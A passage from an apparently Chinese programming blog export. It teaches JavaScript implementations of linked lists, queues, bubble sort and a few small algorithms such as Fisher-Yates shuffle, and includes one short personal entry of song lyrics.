<li>但也正因如此，我们不要忘了，在JavaScript中，数组也是对象，js中的数组是作为对象被实现的，所以与其他语言(如：C++、java)相比，性能会差很多。</li>
</ul>
</li>
</ul>
<p>另外，数组中元素的存储地址是连续的，但是当我们的数据量很大时，可能会很难寻找到空间足够大又连续的内存空间，而链表的存储方式不要求地址连续。</p>
<p>但并不是说链表一定比数组好，数组的优势在于随机访问，比如我们访问数组的第20个元素，可以很快的访问到，然而链表就会比较困难，另外在链表中，我们也不会说第几元素，我们会用链表中节点之间的引用来描述元素间的关系。</p>
<h4 id="链表的概念"><a href="#链表的概念" class="headerlink" title="链表的概念"></a>链表的概念</h4><h6 id="节点（Node）"><a href="#节点（Node）" class="headerlink" title="节点（Node）"></a>节点（Node）</h6><p>链表中的元素称为节点</p>
<h6 id="链"><a href="#链" class="headerlink" title="链"></a>链</h6><p>节点间的引用称为链</p>
<h6 id="节点的种类"><a href="#节点的种类" class="headerlink" title="节点的种类"></a>节点的种类</h6><ul>
<li>单向链表</li>
<li>单向循环链表</li>
<li>双向链表</li>
<li>双向循环链表</li>
</ul>
<h4 id="JavaScript实现"><a href="#JavaScript实现" class="headerlink" title="JavaScript实现"></a>JavaScript实现</h4><h6 id="单向链表"><a href="#单向链表" class="headerlink" title="单向链表"></a>单向链表</h6><p>通常情况下，我们会选择一个头结点(Head)作为链表的接入点，如果用一张图来表示单向链表，那么应该是这样的：</p>
<p><img src="/static/img/dxlb.png" width="500"></p>
<p>我们需要两个类，一个节点类（Node），另外一个是链表类（Llist），先创建 <code>Node</code> 类，如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Node</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.data = data</span><br><span class="line">    <span class="keyword">this</span>.next = <span class="literal">null</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后是链表类 <code>Llist</code>：</p>
<p>在创建 <code>Llist</code> 之前，我们要明确单向链表的属性和方法：</p>
<ul>
<li>属性：<ul>
<li>head (头节点的引用)</li>
</ul>
</li>
<li>方法：<ul>
<li>insertAfter</li>
</ul>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Llist</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 头节点</span></span><br><span class="line">    <span class="keyword">this</span>.head = <span class="keyword">new</span> Node(<span class="string">'head'</span>)</span><br><span class="line">&#125;</span><br><span class="line">Llist.prototype = &#123;</span><br><span class="line">    <span class="keyword">constructor</span>: Llist,</span><br><span class="line">    // 插入节点：将 newNode节点 插入到 node节点 之后</span><br><span class="line">    insertAfter: function (newNode, data) &#123;</span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 删除节点</span></span><br><span class="line">    remove: <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 查找节点</span></span><br><span class="line">    find: <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 显示全部节点</span></span><br><span class="line">    display: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先，我们来看一下 <code>insertAfter</code> 方法，<code>insertAfter</code> 方法用来将新节点 <code>newNode</code> 插入到 <code>data</code> 属性为给定值的节点的后面。所以我们需要 <code>find</code> 方法，该方法用来寻找 <code>data</code> 属性值为给定值的节点，<code>find</code> 方法实现如下</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">find: <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> current = <span class="keyword">this</span>.head</span><br><span class="line">    <span class="keyword">while</span> (current &amp;&amp; current.data != data) &#123;</span><br><span class="line">        current = current.next</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> current</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有了 <code>find</code> 方法，我们就可以轻松实现 <code>insertAfter</code> 方法了：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">insertAfter: <span class="function"><span class="keyword">function</span> (<span class="params">newNode, data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> target = <span class="keyword">this</span>.find(data)</span><br><span class="line">    newNode.next = target.next</span><br><span class="line">    target.next = newNode</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>remove</code> 方法用来删除 <code>data</code> 属性值为给定值的节点，删除节点的思路是：找到要删除的节点的前一个节点，然后让该节点的 <code>next</code> 属性指向要删除的节点的 <code>next</code> 属性所指向的节点，为此，我们需要一个辅助方法 <code>findPrev</code> 用来寻找要删除节点的前一个节点：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">findPrev: <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> current = <span class="keyword">this</span>.head</span><br><span class="line">    <span class="keyword">while</span> (current &amp;&amp; current.next &amp;&amp; current.next.data != data) &#123;</span><br><span class="line">        current = current.next</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> current</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有了 <code>findPrev</code> 我们就可以实现 <code>remove</code> 方法了：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">remove: <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> prev = <span class="keyword">this</span>.findPrev(data)</span><br><span class="line">    <span class="keyword">if</span> (prev.next) &#123;</span><br><span class="line">        prev.next = prev.next.next</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后，我们来写一个遍历所有节点的方法，用来显示节点数据：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">display: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> current = <span class="keyword">this</span>.head</span><br><span class="line">    <span class="keyword">while</span> (current.next) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(current.next.data)</span><br><span class="line">        current = current.next</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接下来，我们就可以写一个测试脚本了：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> list = <span class="keyword">new</span> Llist()</span><br><span class="line"><span class="keyword">var</span> new1 = <span class="keyword">new</span> Node(<span class="string">'new1'</span>)</span><br><span class="line"><span class="keyword">var</span> new2 = <span class="keyword">new</span> Node(<span class="string">'new2'</span>)</span><br><span class="line"><span class="keyword">var</span> new3 = <span class="keyword">new</span> Node(<span class="string">'new3'</span>)</span><br><span class="line">list.insertAfter(new1, <span class="string">'head'</span>)</span><br><span class="line">list.insertAfter(new2, <span class="string">'new1'</span>)</span><br><span class="line">list.insertAfter(new3, <span class="string">'new1'</span>)</span><br><span class="line">list.display()  <span class="comment">// 输出：new1 new3 new2</span></span><br><span class="line">list.remove(<span class="string">'new3'</span>)</span><br><span class="line">list.display()  <span class="comment">// 输出：new1 new2</span></span><br></pre></td></tr></table></figure>
<h6 id="双向链表"><a href="#双向链表" class="headerlink" title="双向链表"></a>双向链表</h6><p>双向链表与单向链表相比，每一个节点多出一个属性 <code>prev</code>，该属性指向当前节点的前一个节点，头节点的 <code>prev</code> 属性指向 <code>Null</code>：</p>
<p><img src="/static/img/sxlb.png" width="600"></p>
<p>双向链表相比于单向链表，在删除节点的时候，效率会更高，还记我们在单向链表中删除节点时需要使用 <code>findPrev</code> 方法去查找目标节点的前一个节点吗？在双向链表中，我们仅仅通过目标节点的 <code>prev</code> 属性即可访问其前一个节点，而不需要遍历查找，效率自然会高，但在插入节点的时候我们需要做更多的事情，除了保证 <code>next</code> 属性指向正确之外，还要保证 <code>prev</code> 属性指向正确，下面是完整的双向链表实现：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Llist</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 头节点</span></span><br><span class="line">    <span class="keyword">this</span>.head = <span class="keyword">new</span> Node(<span class="string">'head'</span>)</span><br><span class="line">&#125;</span><br><span class="line">Llist.prototype = &#123;</span><br><span class="line">    <span class="keyword">constructor</span>: Llist,</span><br><span class="line">    // 插入节点：将 newNode节点 插入到 node节点 之后</span><br><span class="line">    insertAfter: function (newNode, data) &#123;</span><br><span class="line">        <span class="keyword">var</span> target = <span class="keyword">this</span>.find(data)</span><br><span class="line">        newNode.next = target.next</span><br><span class="line">        <span class="keyword">if</span> (target.next) &#123;</span><br><span class="line">            target.next.prev = newNode</span><br><span class="line">        &#125;</span><br><span class="line">        target.next = newNode</span><br><span class="line">        newNode.prev = target</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 删除节点</span></span><br><span class="line">    remove: <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> target = <span class="keyword">this</span>.find(data)</span><br><span class="line">        target.prev.next = target.next</span><br><span class="line">        target.next.prev = target.prev</span><br><span class="line">        target.next = target.prev = <span class="literal">null</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 查找节点</span></span><br><span class="line">    find: <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> current = <span class="keyword">this</span>.head</span><br><span class="line">        <span class="keyword">while</span> (current &amp;&amp; current.data != data) &#123;</span><br><span class="line">            current = current.next</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> current</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 显示全部节点</span></span><br><span class="line">    display: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> current = <span class="keyword">this</span>.head</span><br><span class="line">        <span class="keyword">while</span> (current.next) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(current.next.data)</span><br><span class="line">            current = current.next</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'======'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="单向循环链表"><a href="#单向循环链表" class="headerlink" title="单向循环链表"></a>单向循环链表</h6><p>我们仅仅需要添加一行代码，就可以把单向链表修改为单向循环链表。</p>
<p>还记的单向链表中的头节点的 <code>next</code> 属性最初指向的是什么吗？是 <code>Null</code>，当我们在头节点后面添加一个节点之后，头节点的 <code>next</code> 便指向了新添加的节点，而新添加的节点会指向 <code>Null</code>，也就是说，随着节点的添加，头节点最初的指向，总会传递给最后一个节点。既然如此，如果我们在初始化链表的时候，使头节点的 <code>next</code> 属性指向自身会怎么样？答案是：随着节点的添加，最后一个节点总会指向头节点。这样我们就得到了一个单向循环链表：</p>
<p>只需要在 <code>Llist</code> 类中添加一句：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">this</span>.head.next = <span class="keyword">this</span>.head</span><br></pre></td></tr></table></figure>
<p>完整代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Llist</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.head = <span class="keyword">new</span> Node(<span class="string">'head'</span>)</span><br><span class="line">    <span class="keyword">this</span>.head.next = <span class="keyword">this</span>.head</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最终效果如下图：</p>
<p><img src="/static/img/dxxhlb.png" width="500"></p>
<h6 id="双向循环链表"><a href="#双向循环链表" class="headerlink" title="双向循环链表"></a>双向循环链表</h6><p>对于双向循环链表，我们同样可以通过对双向链表的修改得到，我们来看看双向链表的示意图：</p>
<p><img src="/static/img/sxlb.png" width="600"></p>
<p>对于双向循环链表，我们期望应该是这样的：</p>
<p><img src="/static/img/sxxhlb.png" width="500"></p>
<p>我们增加了两条线（图中的 线1 和 线2），对于第一条线，我们同样可以利用创造单向循环链表的方式来构建，即：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Llist</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.head = <span class="keyword">new</span> Node(<span class="string">'head'</span>)</span><br><span class="line">    <span class="keyword">this</span>.head.next = <span class="keyword">this</span>.head      <span class="comment">// 这句话是重点</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对于线2，我们可以在插入节点的方法 <code>insertAfter</code> 中做文章，如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">insertAfter: <span class="function"><span class="keyword">function</span> (<span class="params">newNode, data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> target = <span class="keyword">this</span>.find(data)</span><br><span class="line">    newNode.next = target.next</span><br><span class="line">    <span class="keyword">if</span> (target.next) &#123;</span><br><span class="line">        target.next.prev = newNode</span><br><span class="line">    &#125;</span><br><span class="line">    target.next = newNode</span><br><span class="line">    newNode.prev = target</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里是新添加的内容</span></span><br><span class="line">    <span class="keyword">if</span> (newNode.next === <span class="keyword">this</span>.head) &#123;</span><br><span class="line">        <span class="keyword">this</span>.head.prev = newNode</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们添加了一个 <code>if</code> 语句，这段代码的意思是，当我们在添加完节点之后，对新节点进行判断，如果新节点的 <code>next</code> 属性指向头节点，那么说明新添加的节点是最后一个节点，那么我们只需要让头节点的 <code>prev</code> 属性指向该节点即可了，这样我们就得到了一个双向循环链表</p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>链表</tag>
      </tags>
  </entry>
  <entry>
    <title>杂文-世界末日</title>
    <url>/2018/05/08/%E6%9D%82%E6%96%87_%E4%B8%96%E7%95%8C%E6%9C%AB%E6%97%A5/</url>
    <content><![CDATA[<h2 id="但愿绝望和无奈远走高飞"><a href="#但愿绝望和无奈远走高飞" class="headerlink" title="但愿绝望和无奈远走高飞"></a>但愿绝望和无奈远走高飞</h2><h4 id="坦率讲，还是挺过瘾的，至少感觉自己还可以坚持"><a href="#坦率讲，还是挺过瘾的，至少感觉自己还可以坚持" class="headerlink" title="坦率讲，还是挺过瘾的，至少感觉自己还可以坚持"></a>坦率讲，还是挺过瘾的，至少感觉自己还可以坚持</h4><ul>
<li>想笑来伪装掉下的眼泪</li>
<li>点点头承认自己会怕黑</li>
<li>我只求能借一点的时间来陪</li>
<li>你却连同情都不给</li>
<li>想哭来试探自己麻痹了没</li>
<li>全世界好像只有我疲惫</li>
<li>无所谓反正难过就敷衍走一回</li>
<li>但愿绝望和无奈远走高飞</li>
<li>天灰灰会不会</li>
<li>让我忘了你是谁</li>
<li>夜越黑梦违背</li>
<li>难追难回味</li>
<li>我的世界将被摧毁</li>
<li>也许事与愿违</li>
<li>累不累睡不睡</li>
<li>单影无人相依偎</li>
<li>夜越黑梦违背</li>
<li>有谁肯安慰</li>
<li>我的世界将被摧毁</li>
<li>也许颓废也是另一种美</li>
</ul>
]]></content>
      <categories>
        <category>杂文</category>
      </categories>
      <tags>
        <tag>杂文</tag>
        <tag>心情</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构-队列</title>
    <url>/2018/04/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84_%E9%98%9F%E5%88%97/</url>
    <content><![CDATA[<h2 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h2><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>队列是一种先进先出(first-in-first-out)的数据结构，只允许在一段插入数据，在另一端读取数据。对队列的操作有如下几种：</p>
<ul>
<li>入队（向队列尾部插入新元素）</li>
<li>出队（删除队列头部的元素）</li>
<li>读取队头的元素（获取但不删除队列头部的元素）</li>
<li>清空队列</li>
<li>获取队列的元素个数</li>
<li>等…</li>
</ul>
<h4 id="JavaScript实现"><a href="#JavaScript实现" class="headerlink" title="JavaScript实现"></a>JavaScript实现</h4><p>我们知道，JavaScript数组原生提供了队列方法，如：<code>push</code>、<code>pop</code>、<code>unshift</code>、<code>shift</code> 等等，所以我们既可以用数组来模拟栈，又可以用数组来模拟队列，但正因为这样，数组既不能严格的作为栈使用，也不能严格的作为队列使用，所以我们有必要手动封装严格的队列的定义</p>
<h6 id="队列的方法和属性"><a href="#队列的方法和属性" class="headerlink" title="队列的方法和属性"></a>队列的方法和属性</h6><ul>
<li>属性<ul>
<li>无</li>
<li>或者自定义需要的属性</li>
</ul>
</li>
<li>方法<ul>
<li>enqueue(element)</li>
<li>dequeue()</li>
<li>peek()</li>
<li>clear()</li>
<li>length()</li>
</ul>
</li>
</ul>
<h6 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Queue</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.store = []</span><br><span class="line">&#125;</span><br><span class="line">Queue.prototype = &#123;</span><br><span class="line">    <span class="keyword">constructor</span>: Queue,</span><br><span class="line">    enqueue: function (element) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.store.push(element)</span><br><span class="line">    &#125;,</span><br><span class="line">    dequeue: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.store.shift()</span><br><span class="line">    &#125;,</span><br><span class="line">    peek: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.store[<span class="number">0</span>]</span><br><span class="line">    &#125;,</span><br><span class="line">    clear: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.store.length = <span class="number">0</span></span><br><span class="line">    &#125;,</span><br><span class="line">    length: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.store.length</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的代码是一个极简的队列实现，我们可以写如下测试代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> qu = <span class="keyword">new</span> Queue()</span><br><span class="line"></span><br><span class="line">qu.enqueue(<span class="string">'1'</span>)</span><br><span class="line">qu.enqueue(<span class="string">'2'</span>)</span><br><span class="line">qu.enqueue(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(qu.peek())  <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line">qu.dequeue()</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(qu.peek())  <span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line">qu.clear()</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(qu.peek())  <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>
<h4 id="优先队列"><a href="#优先队列" class="headerlink" title="优先队列"></a>优先队列</h4><p>一般情况下，队列始终保持着先进先出的原则，但有些业务场景，并不一定要求先进来的要先出去，在出队的时候，要考虑队列中所有元素权重因子，优先级最高的元素最先出队，这种队列叫做<code>优先队列</code>。</p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>队列</tag>
      </tags>
  </entry>
  <entry>
    <title>算法-常见算法</title>
    <url>/2018/05/30/%E7%AE%97%E6%B3%95_%E4%B8%89%E4%B8%AA%E5%B0%8F%E7%AE%97%E6%B3%95%E9%A2%98/</url>
    <content><![CDATA[<h2 id="计算一个二维数组全部组合"><a href="#计算一个二维数组全部组合" class="headerlink" title="计算一个二维数组全部组合"></a>计算一个二维数组全部组合</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> array =[[<span class="number">1</span>,<span class="number">2</span>],[<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>],[<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>]]</span><br><span class="line"><span class="keyword">let</span> len = array.length;</span><br><span class="line"><span class="keyword">let</span> result = [];</span><br><span class="line"><span class="keyword">let</span> indexMap = &#123;&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">countResult</span>(<span class="params">start</span>) </span>&#123;</span><br><span class="line">    start++;</span><br><span class="line">    <span class="keyword">for</span> (indexMap[start] = <span class="number">0</span>; indexMap[start] &lt; array[start].length; indexMap[start]++) &#123;</span><br><span class="line">    	<span class="keyword">if</span> (start &lt; len - <span class="number">1</span>) &#123;</span><br><span class="line">            countResult(start);</span><br><span class="line">    	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (start === len - <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> temp = [];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> i = len - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">                temp.push(array[start - i][indexMap[start - i]]);</span><br><span class="line">            &#125;</span><br><span class="line">            result.push(temp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">countResult(<span class="number">-1</span>);</span><br><span class="line"><span class="built_in">console</span>.log(result);</span><br></pre></td></tr></table></figure>
<h2 id="青蛙跳台阶算法（斐波那契数列）"><a href="#青蛙跳台阶算法（斐波那契数列）" class="headerlink" title="青蛙跳台阶算法（斐波那契数列）"></a>青蛙跳台阶算法（斐波那契数列）</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jumpFloor2</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">   <span class="keyword">let</span> target = <span class="number">0</span>, number1 = <span class="number">1</span>, number2 = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (n &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">if</span> (n === <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">   <span class="keyword">if</span> (n === <span class="number">2</span>) <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">   <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">3</span>;i &lt;= n;i++) &#123;</span><br><span class="line">       target = number1 + number2;</span><br><span class="line">       number1 = number2;</span><br><span class="line">       number2 = target;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> target;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="洗牌算法"><a href="#洗牌算法" class="headerlink" title="洗牌算法"></a>洗牌算法</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shuffle</span>(<span class="params">array</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = array.length; i--;) &#123;</span><br><span class="line">        <span class="keyword">let</span> j = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * (i + <span class="number">1</span>));</span><br><span class="line">        [array[i], array[j]] = [array[j], array[i]]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>小算法</tag>
      </tags>
  </entry>
  <entry>
    <title>算法-基础排序算法</title>
    <url>/2018/04/17/%E7%AE%97%E6%B3%95_%E5%9F%BA%E7%A1%80%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h2 id="基本排序算法"><a href="#基本排序算法" class="headerlink" title="基本排序算法"></a>基本排序算法</h2><h4 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h4><h5 id="算法简介"><a href="#算法简介" class="headerlink" title="算法简介"></a>算法简介</h5><p>冒泡排序属于基本排序算法之一，基本排序算法的一个特点是：需要两层嵌套的循环。外层循环用于遍历数组的每一项，内层循环用于对元素进行比较。</p>
<p class="tip">算法的时间复杂度为 O(n²)</p>

<h5 id="算法描述"><a href="#算法描述" class="headerlink" title="算法描述"></a>算法描述</h5><p>冒泡这个名字来自于该算法的排序过程，即数据会像气泡一样从数组的一端浮动到另外一端。</p>
<p>以升序为例，算法的过程为：</p>
<ul>
<li>1、使用数组的第一个元素和数组的第二个元素作比较，如果第一个元素大于第二个元素，就叫唤它们的位置。</li>
<li>2、再使用数组的第二个元素和数组的第三个元素作比较，比较方式同步骤一</li>
<li>3、如步骤一和步骤二的方式，当第一轮比较结束之后，能够保证数组最右端的项为最大值</li>
<li>4、进入下一轮比较，此时由于已知数组的最后一项为最大值，所以比较的次数可以减少一次</li>
<li>5、重复步骤4直到排序完成</li>
</ul>
<p>一图胜千言（图片来自：<a href="https://github.com/damonare/Sorts" target="_blank" rel="noopener">https://github.com/damonare/Sorts</a>)：</p>
<p><img src="/static/img/bubble-sort.gif"></p>
<h5 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bubbleSort</span> (<span class="params">arr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> num = arr.length</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; num - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="comment">// 这里的 num - 1 - i 中的 i 很关键，保证了每轮的比较次数减一</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; num - <span class="number">1</span> - i; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="comment">// 交换元素</span></span><br><span class="line">                <span class="keyword">var</span> temp = arr[j]</span><br><span class="line">                arr[j] = arr[j + <span class="number">1</span>]</span><br><span class="line">                arr[j + <span class="number">1</span>] = temp</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="优化冒泡排序"><a href="#优化冒泡排序" class="headerlink" title="优化冒泡排序"></a>优化冒泡排序</h5><p>假设我们有如下数组：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]</span><br></pre></td></tr></table></figure>
<p>对于该数组的排序，其实我们只需要将数组的第一个元素 <code>2</code> 与数组的第二个元素 <code>1</code> 交换一下位置即可，因为后边的数据已经是有序的了。</p>
<p>但是我们上面的冒泡排序算法，在对该数组进行排序时第一轮排序依然会对比到数组的最后一个元素，第二个排序会对比到数组的倒数第二个元素。这个时候，我们是有一些优化手段的，其中一个解决办法就是设置一个标志，该标志存储了最后一次数据位置交换的索引。大家可以想象一下 <code>最后一次位置交换</code> 以为着什么？它意味着该位置后边的元素已经是有序的了。所以下一轮比较只需要比较到该位置即可。</p>
<p>优化后的代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bubbleKeySort</span> (<span class="params">arr</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// pos为最后一次交换数据位置的标志，初始化为数组最后一个元素</span></span><br><span class="line">    <span class="keyword">var</span> pos = arr.length - <span class="number">1</span></span><br><span class="line">    <span class="comment">// 只要 pos 大于0，就开启新一轮的比较</span></span><br><span class="line">    <span class="keyword">while</span> (pos &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 变量 p 用来存储本轮比较最后一次交换数据的位置，初始化为 0，这个很关键，因为当本轮比较结束之后如果 p 仍然为 0，那么就不会再执行 while 循环，此时数据已经排好序</span></span><br><span class="line">        <span class="keyword">var</span> p = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; pos; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="comment">// 更新 p 的值</span></span><br><span class="line">                p = j</span><br><span class="line">                <span class="keyword">var</span> temp = arr[j]</span><br><span class="line">                arr[j] = arr[j + <span class="number">1</span>]</span><br><span class="line">                arr[j + <span class="number">1</span>] = temp</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 本轮比较结束之后，更新 pos 的值</span></span><br><span class="line">        pos = p</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
